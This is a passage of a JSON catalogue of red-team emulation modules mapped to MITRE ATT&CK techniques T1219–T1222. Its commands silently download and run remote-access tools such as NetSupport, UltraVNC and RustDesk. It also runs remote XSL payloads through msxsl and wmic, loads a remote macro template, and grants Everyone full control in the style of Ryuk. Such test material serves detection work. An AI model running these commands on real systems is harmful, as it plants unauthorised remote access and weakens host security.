          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\T1219_NetSupport.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "NetSupport must be downloaded and exist on the disk at the specified location. (#{NetSupport_Path})\n",
          "check_command": "if (Test-Path \"#{NetSupport_Path}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\n(New-Object Net.WebClient).DownloadFile(\"https://nsproducts.azureedge.net/nsm-1270/en/Setup.exe\",\"#{NetSupport_Path}\")\n"
        }
      ],
      "rx_module_id": "ecca999b-e0c8-40e8-8416-ad320b146a75",
      "module_name": "NetSupport - RAT Execution"
    },
    {
      "index": 1047,
      "technique_id": "T1219",
      "technique_name": "Remote Access Software",
      "description": "A recent trend by threat actors, once a foothold is established, maintain long term persistence using third party remote services such as UltraViewer to provide the operator with access to the network using legitimate services. \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Start-Process -Wait -FilePath \"#{UltraViewer_Path}\" -Argument \"/silent\" -PassThru\nStart-Process 'C:\\Program Files (x86)\\UltraViewer\\UltraViewer_Desktop.exe'\n",
        "elevation_required": true,
        "cleanup_command": "Stop-Process -Name \"UltraViewer_Desktop\" -Force -ErrorAction SilentlyContinue\n"
      },
      "variables": [
        {
          "name": "UltraViewer_Path",
          "description": "Path to the UltraViewer executable.",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\T1219_UltraViewer.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "Ultraviewer installer must be downloaded and exist on the disk at the specified location. (#{UltraViewer_Path})\n",
          "check_command": "if (Test-Path \"#{UltraViewer_Path}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\n(New-Object Net.WebClient).DownloadFile(\"https://www.ultraviewer.net/en/UltraViewer_setup_6.5_en.exe\",\"#{UltraViewer_Path}\")\n"
        }
      ],
      "rx_module_id": "19acf63b-55c4-4b6a-8552-00a8865105c8",
      "module_name": "UltraViewer - RAT Execution"
    },
    {
      "index": 1048,
      "technique_id": "T1219",
      "technique_name": "Remote Access Software",
      "description": "An adversary may attempt to trick the user into downloading UltraVNC for use as a C2 channel.\nUpon successful execution, UltraVNC will be executed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Start-Process #{UltraVNC_Viewer_Path}\n",
        "elevation_required": true,
        "cleanup_command": "Stop-Process -Name \"vncviewer\" -force -erroraction silentlycontinue\n"
      },
      "variables": [
        {
          "name": "UltraVNC_Viewer_Path",
          "description": "Path of UltraVNC Viewer executable",
          "type": "path",
          "default_value": "$env:ProgramFiles\\'uvnc bvba\\UltraVnc\\vncviewer.exe'"
        }
      ],
      "prerequisites": [
        {
          "description": "UltraVNC must exist at (#{UltraVNC_Viewer_Path})\n",
          "check_command": "if (Test-Path #{UltraVNC_Viewer_Path}) {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://www.uvnc.eu/download/1381/UltraVNC_1_3_81_X64_Setup.exe\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\vncsetup.exe\"\nstart-process \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\vncsetup.exe\" /silent\n"
        }
      ],
      "rx_module_id": "42e51815-a6cc-4c75-b970-3f0ff54b610e",
      "module_name": "UltraVNC Execution"
    },
    {
      "index": 1049,
      "technique_id": "T1219",
      "technique_name": "Remote Access Software",
      "description": "An adversary may attempt to trick the user into downloading MSP360 Connect for use as a C2 channel.\nUpon successful execution, MSP360 Connect will be executed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Start-Process #{MSP360_Connect_Path}\n",
        "elevation_required": true,
        "cleanup_command": "Stop-Process -Name \"Connect\" -force -erroraction silentlycontinue\n"
      },
      "variables": [
        {
          "name": "MSP360_Connect_Path",
          "description": "Path of MSP360 executable",
          "type": "path",
          "default_value": "$env:ProgramFiles\\Connect\\Connect.exe"
        },
        {
          "name": "MSP360_Download_Url",
          "description": "URL to download MSP360 Connect from",
          "type": "url",
          "default_value": null
        }
      ],
      "prerequisites": [
        {
          "description": "MSP360 must exist at (#{MSP360_Connect_Path})\n",
          "check_command": "if (Test-Path #{MSP360_Connect_Path}) {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\msp360connect.exe\" \"#{MSP360_Download_Url}\"\nstart-process \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\msp360connect.exe\" /S    \n"
        }
      ],
      "rx_module_id": "b1b8128b-c5d4-4de9-bf70-e60419274562",
      "module_name": "MSP360 Connect Execution"
    },
    {
      "index": 1050,
      "technique_id": "T1219",
      "technique_name": "Remote Access Software",
      "description": "An adversary may attempt to trick the user into downloading RustDesk and use this to maintain access to the machine. \nDownload of RustDesk installer will be at the destination location when successfully executed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$file = Join-Path $env:USERPROFILE \"Desktop\\rustdesk-1.2.3-1-x86_64.exe\"\nInvoke-WebRequest  -OutFile $file https://github.com/rustdesk/rustdesk/releases/download/1.2.3-1/rustdesk-1.2.3-1-x86_64.exe\nStart-Process -FilePath $file \"/S\"",
        "elevation_required": false,
        "cleanup_command": "$file = Join-Path $env:USERPROFILE \"Desktop\\rustdesk-1.2.3-1-x86_64.exe\"\nRemove-Item $file1 -ErrorAction Ignore"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "f1641ba9-919a-4323-b74f-33372333bf0e",
      "module_name": "RustDesk Files Detected Test on Windows"
    },
    {
      "index": 1051,
      "technique_id": "T1219",
      "technique_name": "Remote Access Software",
      "description": "An adversary may attempt to trick the user into downloading Splashtop for use as a C2 channel.\nUpon successful execution, Splashtop will be executed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Start-Process \"#{Splashtop_Path}\"\n",
        "elevation_required": true,
        "cleanup_command": "Stop-Process -Name \"strwinclt\" -force -erroraction silentlycontinue\n"
      },
      "variables": [
        {
          "name": "Splashtop_Path",
          "description": "Path of Splashtop executable",
          "type": "path",
          "default_value": "${env:programfiles(x86)}\\Splashtop\\Splashtop Remote\\Client for STP\\strwinclt.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "Splashtop must exist at \"#{Splashtop_Path}\"\n",
          "check_command": "if (Test-Path \"#{Splashtop_Path}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\splashtop_install.exe\" \"https://download.splashtop.com/winclient/STP/Splashtop_Personal_Win_v3.6.6.0.exe\"\nstart-sleep 30\nstart-process \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\splashtop_install.exe\" /S  \nstart-sleep 30      \n"
        }
      ],
      "rx_module_id": "b025c580-029e-4023-888d-a42710d76934",
      "module_name": "Splashtop Execution"
    },
    {
      "index": 1052,
      "technique_id": "T1219",
      "technique_name": "Remote Access Software",
      "description": "An adversary may attempt to use Splashtop Streamer to gain unattended remote interactive access. Upon successful execution, Splashtop streamer will be executed.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Start-Process -FilePath \"C:Program Files (x86)\\Splashtop\\Splashtop Remote\\Server\\#{srserver_exe}\"",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "srserver_exe",
          "description": "Splashtop streamer installation executables",
          "type": "string",
          "default_value": "SRServer.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "Splashtop Streamer must be installed in the location",
          "check_command": "if (Test-Path \"C:\\Program Files (x86)\\Splashtop\\Splashtop Remote\\Server\\#{srserver_exe}\") {exit 0} else {exit 1}\n",
          "install_command": "Write-Host Downloading Splashtop Streamer\nNew-Item -Type Directory \"C:\\Temp\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.splashtop.com/win/Splashtop_Streamer_Win_INSTALLER_v3.6.4.1.exe\" -OutFile  \"C:\\Temp\\ExternalPayloads\\Splashtop.exe\"\nWrite-Host Installing Splashtop Streamer\nStart-Process \"c:\\Temp\\ExternalPayloads\\Splashtop.exe\" -Wait -ArgumentList \"/s\""
        }
      ],
      "rx_module_id": "3e1858ee-3550-401c-86ec-5e70ed79295b",
      "module_name": "Splashtop Streamer Execution"
    },
    {
      "index": 1053,
      "technique_id": "T1219",
      "technique_name": "Remote Access Software",
      "description": "An adversary may attempt to trick a user into executing Microsoft Quick Assist Microsoft Store app and connect to the user's machine. \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Start-Process \"shell:AppsFolder\\MicrosoftCorporationII.QuickAssist_8wekyb3d8bbwe!App\"",
        "elevation_required": true,
        "cleanup_command": "Stop-Process -Name quickassist"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "1aea6d15-70f1-4b4e-8b02-397b5d5ffe75",
      "module_name": "Microsoft App Quick Assist Execution"
    },
    {
      "index": 1054,
      "technique_id": "T1220",
      "technique_name": "XSL Script Processing",
      "description": "Executes the code specified within a XSL script tag during XSL transformation using a local payload. \nRequires download of MSXSL. No longer available from Microsoft.\n(Available via Internet Archive https://web.archive.org/web/20200825011623/https://www.microsoft.com/en-us/download/details.aspx?id=21714 ) \nOpen Calculator.exe when test successfully executed, while AV turned off.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"#{msxsl_exe}\" \"#{xmlfile}\" \"#{xslfile}\"\n",
        "elevation_required": false,
        "cleanup_command": "del \"#{msxsl_exe}\" >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "xmlfile",
          "description": "Location of the test XML file on the local filesystem.",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1220\\src\\msxslxmlfile.xml"
        },
        {
          "name": "xslfile",
          "description": "Location of the test XSL script file on the local filesystem.",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1220\\src\\msxslscript.xsl"
        },
        {
          "name": "msxsl_exe",
          "description": "Location of the MSXSL executable.",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\msxsl.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "XML file must exist on disk at specified location (#{xmlfile})\n",
          "check_command": "if (Test-Path \"#{xmlfile}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{xmlfile}\") -ErrorAction Ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1220/src/msxslxmlfile.xml\" -OutFile \"#{xmlfile}\"\n"
        },
        {
          "description": "XSL file must exist on disk at specified location (#{xslfile})\n",
          "check_command": "if (Test-Path \"#{xslfile}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{xslfile}\") -ErrorAction Ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1220/src/msxslscript.xsl\" -OutFile \"#{xslfile}\"\n"
        },
        {
          "description": "msxsl.exe must exist on disk at specified location (#{msxsl_exe})\n",
          "check_command": "if (Test-Path \"#{msxsl_exe}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://web.archive.org/web/20200803205229if_/https://download.microsoft.com/download/f/2/6/f263ac46-1fe9-4ae9-8fd3-21102100ebf5/msxsl.exe\" -OutFile \"#{msxsl_exe}\"\n"
        }
      ],
      "rx_module_id": "ca23bfb2-023f-49c5-8802-e66997de462d",
      "module_name": "MSXSL Bypass using local files"
    },
    {
      "index": 1055,
      "technique_id": "T1220",
      "technique_name": "XSL Script Processing",
      "description": "Executes the code specified within a XSL script tag during XSL transformation using a remote payload.\nRequires download of MSXSL.exe. No longer available from Microsoft.\n(Available via Internet Archive https://web.archive.org/web/20200825011623/https://www.microsoft.com/en-us/download/details.aspx?id=21714 )\nOpen Calculator.exe when test successfully executed, while AV turned off.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"#{msxsl_exe}\" \"#{xmlfile}\" \"#{xslfile}\"\n",
        "elevation_required": false,
        "cleanup_command": "del -Path #{msxsl_exe} >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "xmlfile",
          "description": "Remote location (URL) of the test XML file.",
          "type": "url",
          "default_value": "https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1220/src/msxslxmlfile.xml"
        },
        {
          "name": "xslfile",
          "description": "Remote location (URL) of the test XSL script file.",
          "type": "url",
          "default_value": "https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1220/src/msxslscript.xsl"
        },
        {
          "name": "msxsl_exe",
          "description": "Location of the MSXSL executable.",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\msxsl.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "msxsl.exe must exist on disk at specified location (\"#{msxsl_exe}\")\n",
          "check_command": "if (Test-Path \"#{msxsl_exe}\") {exit 0} else {exit 1}\n",
          "install_command": "Invoke-WebRequest \"https://web.archive.org/web/20200803205229if_/https://download.microsoft.com/download/f/2/6/f263ac46-1fe9-4ae9-8fd3-21102100ebf5/msxsl.exe\" -OutFile \"#{msxsl_exe}\"\n"
        }
      ],
      "rx_module_id": "a7c3ab07-52fb-49c8-ab6d-e9c6d4a0a985",
      "module_name": "MSXSL Bypass using remote files"
    },
    {
      "index": 1056,
      "technique_id": "T1220",
      "technique_name": "XSL Script Processing",
      "description": "Executes the code specified within a XSL script using a local payload.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "wmic #{wmic_command} /FORMAT:\"#{local_xsl_file}\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "wmic_command",
          "description": "WMI command to execute using wmic.exe",
          "type": "string",
          "default_value": "process list"
        },
        {
          "name": "local_xsl_file",
          "description": "Location of the test XSL script file on the local filesystem.",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1220\\src\\wmicscript.xsl"
        }
      ],
      "prerequisites": [
        {
          "description": "XSL file must exist on disk at specified location (#{local_xsl_file})\n",
          "check_command": "if (Test-Path \"#{local_xsl_file}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{local_xsl_file}\") -ErrorAction Ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1220/src/wmicscript.xsl\" -OutFile \"#{local_xsl_file}\"\n"
        }
      ],
      "rx_module_id": "1b237334-3e21-4a0c-8178-b8c996124988",
      "module_name": "WMIC bypass using local XSL file"
    },
    {
      "index": 1057,
      "technique_id": "T1220",
      "technique_name": "XSL Script Processing",
      "description": "Executes the code specified within a XSL script using a remote payload. Open Calculator.exe when test successfully executed, while AV turned off.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "wmic #{wmic_command} /FORMAT:\"#{remote_xsl_file}\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "remote_xsl_file",
          "description": "Remote location of an XSL payload.",
          "type": "url",
          "default_value": "https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1220/src/wmicscript.xsl"
        },
        {
          "name": "wmic_command",
          "description": "WMI command to execute using wmic.exe",
          "type": "string",
          "default_value": "process list"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "7f5be499-33be-4129-a560-66021f379b9b",
      "module_name": "WMIC bypass using remote XSL file"
    },
    {
      "index": 1058,
      "technique_id": "T1221",
      "technique_name": "Template Injection",
      "description": "Open a .docx file that loads a remote .dotm macro enabled template from https://github.com/redcanaryco/raglox-red-team/tree/master/rx_modules/T1221/src/opencalc.dotm \nExecutes the code specified within the .dotm template.\nRequires download of WINWORD found in Microsoft Ofiice at Microsoft: https://www.microsoft.com/en-us/download/office.aspx.  \nDefault docs file opens Calculator.exe when test sucessfully executed, while AV turned off.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "start \"#{docx_file}\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "docx_file",
          "description": "Location of the test docx file on the local filesystem.",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1221\\src\\Calculator.docx"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "1489e08a-82c7-44ee-b769-51b72d03521d",
      "module_name": "WINWORD Remote Template Injection"
    },
    {
      "index": 1059,
      "technique_id": "T1222",
      "technique_name": "File and Directory Permissions Modification",
      "description": "Use fsutil to enable both remote to local and remote to remote symbolic links. This allows access to files from local shortcuts with local or remote paths.\n[reference](https://symantec-enterprise-blogs.security.com/threat-intelligence/noberus-blackcat-alphv-rust-ransomware/)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "fsutil behavior set SymlinkEvaluation R2L:1\nfsutil behavior set SymlinkEvaluation R2R:1\n",
        "elevation_required": true,
        "cleanup_command": "fsutil behavior set SymlinkEvaluation R2L:0\nfsutil behavior set SymlinkEvaluation R2R:0\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "6c4ac96f-d4fa-44f4-83ca-56d8f4a55c02",
      "module_name": "Enable Local and Remote Symbolic Links via fsutil"
    },
    {
      "index": 1060,
      "technique_id": "T1222",
      "technique_name": "File and Directory Permissions Modification",
      "description": "Use reg.exe to enable both remote to local and remote to remote symbolic links. This allows access to files from local shortcuts with local or remote paths.\n[reference](https://symantec-enterprise-blogs.security.com/threat-intelligence/noberus-blackcat-alphv-rust-ransomware/)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\" /v SymlinkRemoteToLocalEvaluation /t REG_DWORD /d \"1\" /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\" /v SymlinkRemoteToRemoteEvaluation /t REG_DWORD /d \"1\" /f\n",
        "elevation_required": true,
        "cleanup_command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\" /v SymlinkRemoteToLocalEvaluation /t REG_DWORD /d \"0\" /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\" /v SymlinkRemoteToRemoteEvaluation /t REG_DWORD /d \"0\" /f\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "78bef0d4-57fb-417d-a67a-b75ae02ea3ab",
      "module_name": "Enable Local and Remote Symbolic Links via reg.exe"
    },
    {
      "index": 1061,
      "technique_id": "T1222",
      "technique_name": "File and Directory Permissions Modification",
      "description": "Use Powershell to enable both remote to local and remote to remote symbolic links. This allows access to files from local shortcuts with local or remote paths.\n[reference](https://symantec-enterprise-blogs.security.com/threat-intelligence/noberus-blackcat-alphv-rust-ransomware/)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "New-ItemProperty -Path HKLM:\\Software\\Policies\\Microsoft\\Windows\\Filesystems\\NTFS -Name SymlinkRemoteToLocalEvaluation -PropertyType DWORD -Value 1 -Force -ErrorAction Ignore\nNew-ItemProperty -Path HKLM:\\Software\\Policies\\Microsoft\\Windows\\Filesystems\\NTFS -Name SymlinkRemoteToRemoteEvaluation -PropertyType DWORD -Value 1 -Force -ErrorAction Ignore\n",
        "elevation_required": true,
        "cleanup_command": "New-ItemProperty -Path HKLM:\\Software\\Policies\\Microsoft\\Windows\\Filesystems\\NTFS -Name SymlinkRemoteToLocalEvaluation -PropertyType DWORD -Value 0 -Force -ErrorAction Ignore\nNew-ItemProperty -Path HKLM:\\Software\\Policies\\Microsoft\\Windows\\Filesystems\\NTFS -Name SymlinkRemoteToRemoteEvaluation -PropertyType DWORD -Value 0 -Force -ErrorAction Ignore\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "6cd715aa-20ac-4be1-a8f1-dda7bae160bd",
      "module_name": "Enable Local and Remote Symbolic Links via Powershell"
    },
    {
      "index": 1062,
      "technique_id": "T1222.001",
      "technique_name": "File and Directory Permissions Modification: Windows File and Directory Permissions Modification",
      "description": "Modifies the filesystem permissions of the specified file or folder to take ownership of the object. Upon execution, \"SUCCESS\" will\nbe displayed for the folder and each file inside of it.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "takeown.exe /f #{file_folder_to_own} /r\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "file_folder_to_own",
          "description": "Path of the file or folder for takeown to take ownership.",
          "type": "path",
          "default_value": "%temp%\\T1222.001_takeown_folder"
        }
      ],
      "prerequisites": [
        {
          "description": "Test requrires a file to take ownership of to be located at (#{file_folder_to_own})\n",
          "check_command": "IF EXIST #{file_folder_to_own} ( EXIT 0 ) ELSE ( EXIT 1 )\n",
          "install_command": "mkdir #{file_folder_to_own}\necho T1222.001_takeown1 >> #{file_folder_to_own}\\T1222.001_takeown1.txt\necho T1222.001_takeown2 >> #{file_folder_to_own}\\T1222.001_takeown2.txt\n"
        }
      ],
      "rx_module_id": "98d34bb4-6e75-42ad-9c41-1dae7dc6a001",
      "module_name": "Take ownership using takeown utility"
    },
    {
      "index": 1063,
      "technique_id": "T1222.001",
      "technique_name": "File and Directory Permissions Modification: Windows File and Directory Permissions Modification",
      "description": "Modifies the filesystem permissions of the specified folder and contents to allow the specified user or group Full Control. If \"Access is denied\"\nis displayed it may be because the file or folder doesn't exit. Run the prereq command to create it. Upon successfull execution, \"Successfully processed 3 files\"\nwill be displayed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "icacls.exe #{file_or_folder} /grant #{user_or_group}:F\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "file_or_folder",
          "description": "Path of the file or folder to change permissions.",
          "type": "path",
          "default_value": "%temp%\\T1222.001_cacls"
        },
        {
          "name": "user_or_group",
          "description": "User or group to allow full control",
          "type": "string",
          "default_value": "Everyone"
        }
      ],
      "prerequisites": [
        {
          "description": "Test requrires a file to modify to be located at (#{file_or_folder})\n",
          "check_command": "IF EXIST #{file_or_folder} ( EXIT 0 ) ELSE ( EXIT 1 )\n",
          "install_command": "mkdir #{file_or_folder}\necho T1222.001_cacls1 >> #{file_or_folder}\\T1222.001_cacls1.txt\necho T1222.001_cacls2 >> #{file_or_folder}\\T1222.001_cacls2.txt\n"
        }
      ],
      "rx_module_id": "a8206bcc-f282-40a9-a389-05d9c0263485",
      "module_name": "cacls - Grant permission to specified user or group recursively"
    },
    {
      "index": 1064,
      "technique_id": "T1222.001",
      "technique_name": "File and Directory Permissions Modification: Windows File and Directory Permissions Modification",
      "description": "Removes the read-only attribute from a file or folder using the attrib.exe command. Upon execution, no output will be displayed.\nOpen the file in File Explorer > Right Click - Prperties and observe that the Read Only checkbox is empty.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "attrib.exe -r #{file_or_folder}\\*.* /s\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "file_or_folder",
          "description": "Path of the file or folder remove attribute.",
          "type": "path",
          "default_value": "%temp%\\T1222.001_attrib"
        }
      ],
      "prerequisites": [
        {
          "description": "Test requrires a file to modify to be located at (#{file_or_folder})\n",
          "check_command": "IF EXIST #{file_or_folder} ( EXIT 0 ) ELSE ( EXIT 1 )\n",
          "install_command": "mkdir #{file_or_folder}\necho T1222.001_attrib1 >> #{file_or_folder}\\T1222.001_attrib1.txt\necho T1222.001_attrib2 >> #{file_or_folder}\\T1222.001_attrib2.txt\nattrib.exe +r #{file_or_folder}\\T1222.001_attrib1.txt\nattrib.exe +r #{file_or_folder}\\T1222.001_attrib2.txt\n"
        }
      ],
      "rx_module_id": "bec1e95c-83aa-492e-ab77-60c71bbd21b0",
      "module_name": "attrib - Remove read-only attribute"
    },
    {
      "index": 1065,
      "technique_id": "T1222.001",
      "technique_name": "File and Directory Permissions Modification: Windows File and Directory Permissions Modification",
      "description": "Attackers leverage an existing Windows binary, attrib.exe, to mark specific files or folder as hidden by using specific flags so that\nthe victim does not see the file.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "mkdir #{file_or_folder} >nul 2>&1\necho T1222.001_attrib1 >> #{file_or_folder}\\T1222.001_attrib1.txt\necho T1222.001_attrib2 >> #{file_or_folder}\\T1222.001_attrib2.txt\nattrib.exe +h #{file_or_folder}\\T1222.001_attrib1.txt\nattrib.exe +h #{file_or_folder}\\T1222.001_attrib2.txt\n",
        "elevation_required": false,
        "cleanup_command": "del /A:H #{file_or_folder}\\T1222.001_attrib*.txt >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "file_or_folder",
          "description": "Path of the files to hide.",
          "type": "path",
          "default_value": "%temp%\\T1222.001_attrib_2"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "32b979da-7b68-42c9-9a99-0e39900fc36c",
      "module_name": "attrib - hide file"
    },
    {
      "index": 1066,
      "technique_id": "T1222.001",
      "technique_name": "File and Directory Permissions Modification: Windows File and Directory Permissions Modification",
      "description": "Invokes the command line similar to that used by Ryuk Ransomware to grant full access to the entire C:\\ drive for Everyone.\n**icacls \"C:\\*\" /grant Everyone:F /T /C /Q**\nHowever, for this raglox we set the permission on C:\\Users\\Public so it completes faster and doesn't irreversibly affect the host.\nYou can set your own path variable to \"C:\\*\" if you prefer.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "icacls \"#{path}\" /grant Everyone:F /T /C /Q",
        "elevation_required": true,
        "cleanup_command": "icacls '#{path}' /restore #{file_path} /q >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "path",
          "description": "Path of folder to recursively set permissions on",
          "type": "path",
          "default_value": "C:\\Users\\Public\\*"
        },
        {
          "name": "file_path",
          "description": "Path of folder permission back",
          "type": "path",
          "default_value": "%temp%\\T1222.001-folder-perms-backup.txt"
        }
      ],
      "prerequisites": [
        {
          "description": "Backup of original folder permissions should exist (for use in cleanup commands)\n",
          "check_command": "IF EXIST #{file_path} ( EXIT 0 ) ELSE ( EXIT 1 )\n",
          "install_command": "icacls #{path} /save #{file_path} /t /q >nul 2>&1\n"
        }
      ],
      "rx_module_id": "ac7e6118-473d-41ec-9ac0-ef4f1d1ed2f6",
      "module_name": "Grant Full Access to folder for Everyone - Ryuk Ransomware Style"
    },
    {
      "index": 1067,
      "technique_id": "T1222.001",
      "technique_name": "File and Directory Permissions Modification: Windows File and Directory Permissions Modification",
      "description": "This test simulates an adversary executing the Windows Resource kit utility SubInAcl. This utility was abused by adversaries in the past in order to modify access permissions. Upon execution, a process creation log should be generated indicating successful execution.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"C:\\Program Files (x86)\\Windows Resource Kits\\Tools\\subinacl.exe\"",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "SubInAclDownloadPath",
          "description": "Download URL for SubInAcl",
          "type": "string",
          "default_value": "https://web.archive.org/web/20120528222424if_/http://download.microsoft.com/download/1/7/d/17d82b72-bc6a-4dc8-bfaa-98b37b22b367/subinacl.msi"
        }
      ],
      "prerequisites": [
        {
          "description": "Download subinacl\n",
          "check_command": "if (Test-Path \"Test-Path C:\\Program Files (x86)\\Windows Resource Kits\\Tools\\subinacl.exe\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Path C:\\Users\\Public\\SubInAcl -ItemType Directory | Out-Null\nInvoke-WebRequest #{SubInAclDownloadPath} -OutFile C:\\Users\\Public\\SubInAcl\\SubInAcl.msi\nmsiexec.exe /i \"C:\\Users\\Public\\SubInAcl\\SubInAcl.msi\" /qn"
        }
      ],
      "rx_module_id": "a8568b10-9ab9-4140-a523-1c72e0176924",
      "module_name": "SubInAcl Execution"
    },
    {
      "index": 1068,
      "technique_id": "T1222.002",
      "technique_name": "File and Directory Permissions Modification: FreeBSD, Linux and Mac File and Directory Permissions Modification",
      "description": "Changes a file or folder's permissions using chmod and a specified numeric mode.\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "chmod #{numeric_mode} #{file_or_folder}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "numeric_mode",
          "description": "Specified numeric mode value",
          "type": "integer",
          "default_value": 755
        },
        {
          "name": "file_or_folder",
          "description": "Path of the file or folder",
          "type": "path",
          "default_value": "/tmp/RAGLOXRedTeam/rx_modules/T1222.002"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "34ca1464-de9d-40c6-8c77-690adf36a135",
